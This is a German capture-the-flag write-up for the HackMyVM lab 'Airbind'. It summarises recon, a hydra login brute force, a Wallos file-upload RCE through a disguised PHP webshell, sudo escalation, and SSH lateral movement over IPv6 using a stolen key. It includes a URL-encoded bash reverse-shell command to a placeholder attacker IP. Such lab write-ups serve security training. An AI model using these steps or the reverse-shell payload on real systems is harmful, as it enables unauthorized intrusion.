# Airbind - HackMyVM Lösungsweg

![Airbind VM Icon](Airbind.png)

Dieses Repository enthält einen Lösungsweg (Walkthrough) für die HackMyVM-Maschine "Airbind".

## Details zur Maschine & zum Writeup

*   **VM-Name:** Airbind
*   **VM-Autor:** DarkSpirit
*   **Plattform:** HackMyVM
*   **Schwierigkeitsgrad (laut Writeup):** Mittel (Medium)
*   **Link zur VM:** [https://hackmyvm.eu/machines/machine.php?vm=Airbind](https://hackmyvm.eu/machines/machine.php?vm=Airbind)
*   **Autor des Writeups:** DarkSpirit
*   **Original-Link zum Writeup:** [https://alientec1908.github.io/Airbind_HackMyVM_Medium/](https://alientec1908.github.io/Airbind_HackMyVM_Medium/)
*   **Datum des Originalberichts:** 07. August 2024

## Verwendete Tools (Auswahl)

*   `arp-scan`
*   `vi`
*   `nikto`
*   `nmap`
*   `gobuster`
*   `curl`
*   `wfuzz`
*   `hydra`
*   `searchsploit`
*   Burp Suite (implizit für Request-Manipulation)
*   `nc` (netcat)
*   `sudo`
*   `cat`
*   `netstat`
*   `ping6`
*   `ssh`
*   `ip`
*   `ifconfig`
*   Standard Linux-Befehle

## Zusammenfassung des Lösungswegs

Das Folgende ist eine gekürzte Version der Schritte, die unternommen wurden, um die Maschine zu kompromittieren, basierend auf dem bereitgestellten Writeup.

### 1. Reconnaissance (Aufklärung)

*   Die Ziel-IP `192.168.2.106` wurde mittels `arp-scan -l` identifiziert.
*   Der Hostname `airbinds.hmv` wurde der IP `192.168.2.106` in der `/etc/hosts`-Datei des Angreifers zugeordnet.
*   Ein `nmap`-Scan (`nmap -sC -sS -sV -AO -T5 192.168.2.106 -p-`) ergab:
    *   **Port 22/tcp (SSH):** `filtered`.
    *   **Port 80/tcp (HTTP):** Offen, Apache httpd 2.4.57 (Ubuntu). Die Seite leitete auf `login.php` weiter und wurde als "Wallos - Subscription Tracker" identifiziert.

### 2. Web Enumeration (Port 80)

*   `nikto` auf `http://192.168.2.106` fand:
    *   Fehlende Security-Header (`X-Frame-Options`, `X-Content-Type-Options`).
    *   PHPSESSID-Cookie ohne `HttpOnly`-Flag.
    *   Verzeichnisauflistung für `/scripts/`, `/db/`, `/includes/`, etc.
    *   `.gitignore` und `.dockerignore` Dateien.
*   `gobuster` auf `http://airbinds.hmv` fand diverse PHP-Dateien (`login.php`, `logos.php`, `auth.php`, `startup.sh`, `nginx.conf`, `manifest.json`).
*   Die `nginx.conf` zeigte, dass PHP-Anfragen an `127.0.0.1:9000` (PHP-FPM) geleitet werden und der Zugriff auf `.db`-Dateien blockiert ist.
*   `wfuzz` zur Subdomain-Enumeration fand keine weiteren Hosts.
*   Im `/db/`-Verzeichnis wurde `wallos.db` (vermutlich SQLite-Datenbank) durch Directory Indexing entdeckt.
*   Die Datei `startup.sh` enthüllte Initialisierungsschritte, Cronjob-Pfade (`/var/www/html/endpoints/cronjobs/`) und Berechtigungsänderungen.

### 3. Initial Access & POC (RCE auf Wallos)

1.  **Zugangsdaten für Wallos gefunden:**
    *   `hydra` wurde gegen `http://airbinds.hmv/login.php` eingesetzt.
    *   Credentials `admin:admin` wurden gefunden.
2.  **Schwachstelle in Wallos identifiziert:**
    *   Nach dem Login wurde auf der `/about.php`-Seite die Version **Wallos v1.11.0** identifiziert.
    *   `searchsploit wallos` fand einen Exploit: **Wallos < 1.11.2 - File Upload RCE (php/webapps/51924.txt)**.
3.  **Ausnutzung der File Upload RCE:**
    *   Ein POST-Request an `/endpoints/subscription/add.php` wurde mit Burp Suite (impliziert) manipuliert:
        *   Eine PHP-Webshell (getarnt mit `GIF89a`-Magic-Bytes) wurde mit `filename="revshell.php"` und `Content-Type: image/jpeg` hochgeladen.
    *   Die Antwort `{"status":"Success",...}` bestätigte den erfolgreichen Upload.
    *   Durch Directory Indexing im Verzeichnis `/images/uploads/logos/` wurde die hochgeladene Datei gefunden (z.B. `1723066478-benhacker.php`).
4.  **Remote Code Execution als `www-data`:**
    *   Die Webshell wurde aufgerufen: `http://airbinds.hmv/images/uploads/logos/SHELLNAME.php?cmd=id`. Die Ausgabe `uid=33(www-data)` bestätigte RCE.
    *   Eine Bash-Reverse-Shell wurde zum Angreifer (Port 9001) etabliert:
        `http://airbinds.hmv/.../SHELLNAME.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FANGREIFER_IP%2F9001%200%3E%261%27`
    *   Shell als `www-data` auf einem System namens `ubuntu` (wahrscheinlich ein Container) wurde erlangt.

### 4. Privilege Escalation (auf dem `ubuntu`-Container zu Root)

*   `sudo -l` als `www-data` auf `ubuntu` zeigte: `(ALL) NOPASSWD: ALL`.
*   Mittels `sudo su` wurden Root-Rechte auf dem `ubuntu`-System erlangt.
*   Die User-Flag auf dem `ubuntu`-System wurde unter `/root/user.txt` gefunden.

### 5. Lateral Movement (IPv6 zum Host `airbind`)

*   Als `root` auf dem `ubuntu`-System wurde der private SSH-Schlüssel `/root/.ssh/id_rsa` gefunden.
*   Netzwerkinformationen zeigten, dass `ubuntu` in einem internen Netz (`10.0.3.0/24`) lief.
*   Vom Angreifer-System wurde `ping6 -I eth0 ff02::1` verwendet, um IPv6-Hosts im lokalen Netzwerk zu entdecken. Dabei wurde die Link-Local-Adresse `fe80::a00:27ff:fedc:2a3b%eth0` des Hostsystems (`airbind`) identifiziert.
*   Ein SSH-Login als `root` vom Angreifer-System zum Host `airbind` (`ssh -i /PFAD/ZUM/id_rsa root@fe80::a00:27ff:fedc:2a3b%eth0`) unter Verwendung des zuvor gefundenen privaten Schlüssels war erfolgreich.
    *(Es wird angenommen, dass der öffentliche Teil dieses Schlüssels auf `airbind` für den Root-Login autorisiert war.)*

### 6. Flags

*   **User-Flag (auf dem `ubuntu`-Container, als `root` gelesen):** `/root/user.txt` (im Writeup als "user.txt (auf ubuntu)" bezeichnet)
    ```
    4408f370877687429c6ab332e6f560d0
    ```
*   **Root-Flag (auf dem Hostsystem `airbind`, als `root` gelesen):** `/root/root.txt`
    ```
    2bd693135712f88726c22770278a2dcf
    ```

## Haftungsausschluss (Disclaimer)

Dieser Lösungsweg dient zu Bildungszwecken und zur Dokumentation der Lösung für die "Airbind" HackMyVM-Maschine. Die Informationen sollten nur in ethischen und legalen Kontexten verwendet werden, wie z.B. bei CTFs und autorisierten Penetrationstests.
